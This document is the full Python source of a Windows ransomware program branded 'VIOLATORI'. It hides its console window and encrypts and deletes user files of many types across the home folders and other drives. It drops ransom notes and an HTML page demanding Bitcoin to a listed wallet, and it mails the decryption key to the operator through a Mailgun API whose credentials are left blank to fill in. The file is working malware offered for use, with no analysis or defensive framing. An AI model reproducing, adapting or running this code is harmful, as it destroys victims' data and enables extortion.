import win32gui, win32con

hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide, win32con.SW_HIDE)

from getpass import getuser
import sys

username = getuser()
from base64 import standard_b64decode

if username == standard_b64decode(b'V0RBR1V0aWxpdHlBY2NvdW50').decode():
    sys.exit()

try:
    f = open('C:/Users/'+username+'/seeifexists.txt','x')
except:
    sys.exit()


from cryptography.fernet import Fernet
from os import remove , system
from subprocess import check_output
from random import randint
from requests import post
from platform import platform
import webbrowser
from urllib import request


path1 ='C:/Users/'+username+'/Documents/'
path2 ='C:/Users/'+username+'/Downloads/'
path3 ='C:/Users/'+username+'/Pictures/'
path4 ='C:/Users/'+username+'/Videos/'
path5 ='C:/Users/'+username+'/Music/'
path6 ='C:/Users/'+username+'/Desktop/'



path_list = [path1 , path2 , path3 , path4 , path5 , path6]


win = platform() #windows info


key = Fernet.generate_key() # key

enc = Fernet(key)#give him to the class

code = randint(1,1000)+2**10+(randint(1,10)) #random code

must_send = 'code : '+str(code)+'\nkey : '+key.decode()+'\nusername : '+username+'\nplatform : '+win # email text format



#EDIT THIS PART WITH YOUR MAILGUN EMAIL API
linkb = b''
real_link = standard_b64decode(linkb).decode()

fromb = b''
real_from = standard_b64decode(fromb).decode()

apib = b''
real_api = standard_b64decode(apib).decode()

tob = b''
real_to = standard_b64decode(tob).decode()
# *functions*


#send mail (MailGun API) 
def send_message():
	return post(
		real_link,
		auth=("api", real_api),
		data={"from": real_from,
			"to": real_to,
			"subject": "new enc info",
			"text": must_send})


def encrypt_fuction(): # Encryption

    def finddrives():
        default_names =[
            'A:','B:',
            'D:','E:',
            'F:','G:',
            'H:','I:',
            'J:','K:',
            'L:','M:',
            'N:','O:',
            'P:','Q:',
            'R:','S:',
            'T:','U:',
            'V:','W:',
            'X:','Y:',
            'Z:',
            ]
        drives_on_cmd = check_output('net share',shell = True).decode()
        found = []

        for i in default_names:
            if i in drives_on_cmd:
                found.append(i)
        return found

    drive_names = finddrives()#without C

    formats = [
        'jfif','jpg','jpeg',
        'png','mp4','txt',
        'mdf','ldf','sql',
        'py','html','js',
        'ps','doc','docs',
        'wpd','xls','xlsx',
        'ppt','pptx','htm',
        'odt','avi','java',
        'class','csv','dbf',
        'dif','bmp','eps',
        'gif','hqx','wav',
        'tar','rtf','zip',
        'rar','pdf','exe',
        'wmw','mp3'
        ]
    
    

    for cpath in path_list:
        for ext in formats:
            file_list = []
            try:
                
                cmd = check_output('cd '+cpath+' && dir /S /B *.'+ext , shell =True).decode()
                for i in cmd.split('\r\n'):
                    file_list.append(i)

                for file_path in file_list:
                    try:
                        with open(file_path,'rb') as me:
                            data = me.read()
                        data_n = enc.encrypt(data)
                        remove(file_path)

                        with open(file_path+'[ENCRYPTED]','wb') as mw:
                            mw.write(data_n)
                        print(file_path+' (Encrypted)') 
                    
                    except:
                        pass

                
            except:
                pass



    for name in drive_names:

        for exte in formats:
            files_list = []
            try:
                cmd2 = check_output(name+' && dir /S /B *.'+exte,shell=True).decode()

                for i in cmd2.split('\r\n'):
                    files_list.append(i)

                for file_path in files_list:
                    try:
                        with open(file_path,'rb') as me:
                            data = me.read()
                        data_n = enc.encrypt(data)
                        remove(file_path)

                        with open(file_path+'[ENCRYPTED]','wb') as mw:
                            mw.write(data_n)
                        print(file_path+' (Encrypted)') 

                    
                    except:
                        pass

            except:
                pass


def inform():


    message = '\n\ncode : ' +str(code)+'''

    (ALL FILES ENCRYPTED BY VIOLATORI ADVANCED RANSOMWARE)

    * What happened to my files ?
    - Your files are locked (encrypted) with a powerful method.it means you can never recover them without our key or software.

    * Can i recover them ?
    - Yes,in order to do that,you have to buy the decryption key from us,but it is IMPOSSIBLE to decrypt them by yourself.

    ** What should i do ?

    step 1) Buy BitCoins.

    step 2) Send 100$ to this BitCoin wallet:

    1BkkYYXqL2QYDGm5rLEEYaemPCJDGou77A

    step 3) Send us an Email containing your unique code on this page & a picture of your payment.

    Email : VIOLATORI@protonmail.com

    step 4) You will recieve the decryption key or recovery software as soon as possible.

    ***you can also send an encrypted file to decrypt it for free.***
    '''


    for p in path_list:
        for i in range(5):
            try:
                with open(p+'RECOVERFILES'+i*'!'+'.txt','w') as infotext:
                    infotext.write(message)
            
            except:
                pass

    vio_path = 'C:/Users/'+username+'/Downloads/vio.png' #violatori image path

    request.urlretrieve('https://www.uplooder.net/img/image/62/7303b5dfeb837fa88c8b07c20c06a7a2/vio.png',vio_path) #Download vio.png

    html_file = '''

    <!DOCTYPE html>

    <html>
        <head>
            <title>Encrypted by VIOLATORI!!!</title>
        </head>
        
        <body style="background-color: black;">
            
            <h3 style="color: orange;text-align: center;">
                YOUR FILES
            </h3>
            
            <h2 style="color: orange;text-align: center;">
                ARE ENCRYPTED BY
            </h2>
            
            <h1 style="color:orange;text-align:center;">
                <span style="color:red;">
                    VIOLATORI &nbsp;
                </span>
                    ADVANCED RANSOMWARE !!!
            </h1>
        
            <p align="center">
                <img src="'''+vio_path+'''" height="150" width="500" alt="VIOLATOR" >
            </p>
                
            
            <br>
            
            <p class="cd" style="color: white;text-decoration: underline;text-align: center;">
                <font size="5">
                    Your unique code is :'''+str(code)+'''  
                </font>
                
            </p>
            
            <br>
            
            <h3 style="color: cadetblue;text-align: center;">
                What happened to my files ?
            </h3>
            
            <p style="color: dodgerblue;text-align: center;">
                Your files are locked (encrypted) with a powerful method.it means you can never recover them without our key or software.
            </p>
            
            <h3 style="color: cadetblue;text-align: center;">
                Can i recover them ?
            </h3>
            
            <p style="color: dodgerblue;text-align: center;">
                Yes,in order to do that,you have to buy the decryption key from us,but it is <span style="color:darkred">IMPOSSIBLE</span>  to decrypt them by yourself.
            </p>
            
            <h3 style="color: cadetblue;text-align: center;">
                What should i do ?
            </h3>
            
            <p style="color: dodgerblue;text-align: center;">
                
                <span style="color: cadetblue">
                    step 1) 
                </span>
                    Buy BitCoins.
            </p>
            
            <p style="color: dodgerblue;text-align: center;">
                <span style="color: cadetblue">
                    step 2) 
                </span>
                    Send 100$ to this BitCoin wallet:
                
                <br>
                <br>
                
                <span style="color: cadetblue">
                    1BkkYYXqL2QYDGm5rLEEYaemPCJDGou77A
                </span>   
            </p>
            
            <p style="color: dodgerblue;text-align: center;">
                
                <span style="color: cadetblue">
                    step 3) 
                </span>
                    Send us an Email containing your unique code on this page & a picture of your payment.
                <br>
                <br>Email : 
                <span style="color: cadetblue">
                    VIOLATORI@protonmail.com
                </span> 
            <p style="color: dodgerblue;text-align: center;">
                <span style="color: cadetblue">
                    step 4) 
                </span>
                You will recieve the decryption key or recovery software as soon as possible. 
                <br>
                <span style="color: cadetblue">
                    you can also send an encrypted file to decrypt it for free.
                </span>
        
                
        </body>
    </html>
    '''
    print(message+'\n\n')

    with open('C:/Users/'+username+'/Desktop/RECOVERFILES.html','w') as ht:
        ht.write(html_file)

    for i in range(2):

        webbrowser.open('C:/Users/'+username+'/Desktop/RECOVERFILES.html')


if __name__ == '__main__':
    encrypt_fuction()
    inform()
    try:
        send_message()
    except:
        pass